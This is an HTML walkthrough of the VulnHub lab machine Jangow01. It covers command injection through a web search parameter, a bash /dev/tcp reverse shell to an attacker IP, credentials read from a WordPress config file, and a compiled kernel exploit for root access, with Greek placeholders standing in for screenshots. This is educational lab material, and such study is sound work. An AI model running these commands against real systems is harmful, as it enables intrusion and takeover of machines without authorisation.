<h1>Jangow01 - VulnHub Walkthrough</h1>

<h2>Description</h2>
<p>
Jangow01 is an easy-level VulnHub machine that focuses on enumeration, command injection,
credential discovery, and privilege escalation.
</p>

<hr>

<h2>Target Information</h2>
<ul>
  <li><strong>Target IP:</strong> 10.0.2.15</li>
  <li><strong>Platform:</strong> VulnHub</li>
  <li><strong>Attacker Machine:</strong> Kali Linux</li>
</ul>

<hr>

<h2>1. Initial Enumeration</h2>

<p>
I started by scanning the target to identify open ports and services.
</p>

<pre><code>nmap -sV 10.0.2.15</code></pre>

<p>
The scan revealed:
</p>

<ul>
  <li>21/tcp → FTP</li>
  <li>80/tcp → HTTP</li>
</ul>

<p>
Since a web service was exposed, I focused on the HTTP attack surface.
</p>

<p><strong>φωτο απο nmap</strong></p>

<hr>

<h2>2. Web Enumeration</h2>

<p>
While browsing the web application, I identified the following parameter:
</p>

<pre><code>/site/busque.php?buscar=</code></pre>

<p>
This parameter accepted user input directly, which made it a potential target for testing.
</p>

<p><strong>φωτο απο browser με parameter</strong></p>

<hr>

<h2>3. Command Injection</h2>

<p>
To test for command execution, I injected a simple command:
</p>

<pre><code>echo test</code></pre>

<p>
The output was reflected in the response, indicating command execution.
</p>

<p><strong>φωτο απο echo test</strong></p>

<p>
To confirm the execution context:
</p>

<pre><code>whoami</code></pre>

<p>
Result:
</p>

<pre><code>www-data</code></pre>

<p>
This confirmed remote command execution as the web server user.
</p>

<p><strong>φωτο απο whoami</strong></p>

<hr>

<h2>4. Reverse Shell</h2>

<p>
To gain a more interactive shell, I set up a listener on my machine:
</p>

<pre><code>nc -lvnp 443</code></pre>

<p><strong>φωτο απο listener</strong></p>

<p>
Then I used a reverse shell payload through the vulnerable parameter:
</p>

<pre><code>/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.0.2.10/443 0&gt;&amp;1'</code></pre>

<p>
After executing the payload, I received a shell on my listener.
</p>

<p><strong>φωτο απο reverse shell connection</strong></p>

<p>
To stabilize the shell:
</p>

<pre><code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code></pre>

<p><strong>φωτο απο shell stabilization</strong></p>

<hr>

<h2>5. Credential Discovery</h2>

<p>
With command execution available, I explored the web directory:
</p>

<pre><code>ls -la /var/www/html</code></pre>

<p><strong>φωτο απο ls</strong></p>

<p>
Inside the application, I found a WordPress directory and accessed a configuration file:
</p>

<pre><code>cat wordpress/config.php</code></pre>

<p><strong>φωτο απο config.php</strong></p>

<p>
This file contained credentials:
</p>

<pre><code>jangow01 : abygurl69</code></pre>

<hr>

<h2>6. Credential Validation (FTP)</h2>

<p>
Since FTP was open, I tested the discovered credentials.
</p>

<pre><code>ftp 10.0.2.15</code></pre>

<p>
First attempt failed with another username.
</p>

<p><strong>φωτο απο failed ftp login</strong></p>

<p>
Then I used the correct credentials:
</p>

<pre><code>
username: jangow01
password: abygurl69
</code></pre>

<p>
Login was successful.
</p>

<p><strong>φωτο απο successful ftp login</strong></p>

<p>
I listed available files:
</p>

<pre><code>ls</code></pre>

<p><strong>φωτο απο ftp ls</strong></p>

<hr>

<h2>7. User Access</h2>

<p>
Using the same credentials, I switched to the local user:
</p>

<pre><code>su jangow01</code></pre>

<p><strong>φωτο απο su jangow01</strong></p>

<p>
Verification:
</p>

<pre><code>whoami</code></pre>

<pre><code>jangow01</code></pre>

<p>
At this point, I had a stable shell as a valid system user.
</p>

<p><strong>φωτο απο whoami jangow01</strong></p>

<hr>

<h2>8. Local Enumeration</h2>

<p>
Next, I checked the kernel version:
</p>

<pre><code>uname -a</code></pre>

<p><strong>φωτο απο uname</strong></p>

<p>
The system was running:
</p>

<pre><code>Linux 4.4.0-31-generic</code></pre>

<p>
This is an outdated kernel with known privilege escalation vulnerabilities.
</p>

<hr>

<h2>9. Privilege Escalation</h2>

<p>
I initially tested one exploit, but it was unstable and kept retrying.
So I switched to another exploit compatible with this kernel.
</p>

<p>
I compiled and executed the exploit:
</p>

<pre><code>
gcc 45010.c -o exploit
chmod +x exploit
./exploit
</code></pre>

<p><strong>φωτο απο exploit run</strong></p>

<p>
The exploit successfully patched credentials and spawned a root shell.
</p>

<hr>

<h2>10. Root Access</h2>

<pre><code>whoami</code></pre>

<pre><code>root</code></pre>

<p><strong>φωτο απο root</strong></p>

<hr>

<h2>11. Proof</h2>

<pre><code>
cd /root
cat proof.txt
</code></pre>

<p><strong>φωτο απο proof.txt</strong></p>

<hr>

<h2>Summary</h2>

<ul>
  <li>Nmap enumeration</li>
  <li>Web parameter discovery</li>
  <li>Command injection</li>
  <li>Reverse shell access</li>
  <li>Credential extraction from config file</li>
  <li>FTP validation</li>
  <li>User pivot</li>
  <li>Kernel exploit</li>
  <li>Root access</li>
</ul>

<hr>

<h2>Key Takeaways</h2>

<ul>
  <li>Input validation failures lead to command injection</li>
  <li>Configuration files often expose credentials</li>
  <li>Reverse shells provide better control than web shells</li>
  <li>Privilege escalation depends on proper enumeration</li>
</ul>

<hr>

<h2>Disclaimer</h2>

<p>
This walkthrough was conducted in a controlled lab environment for educational purposes only.
</p>
